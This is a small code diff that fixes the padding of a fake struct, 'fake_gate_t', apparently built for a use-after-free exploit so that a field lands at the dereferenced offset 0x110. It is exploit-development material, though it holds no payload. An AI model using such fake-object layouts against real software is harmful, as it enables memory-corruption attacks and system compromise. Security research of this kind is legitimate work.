@@ -30,9 +30,9 @@ typedef struct {
     uint64_t vtable;                    // +0x00
     uint64_t lock;                      // +0x08
     uint64_t refcount;                  // +0x10
-    uint64_t pad1[30];                  // Padding to reach 0x110
+    uint64_t pad1[31];                  // Padding: 0x18 + (31*8) = 0x110 ✓
     uint64_t target_at_0x110;           // +0x110 - UAF dereference target
-    uint64_t pad2[30];                  // Extra padding
+    uint64_t pad2[29];                  // Extra padding to maintain 512 bytes
 } fake_gate_t;
 // ============================================================
 
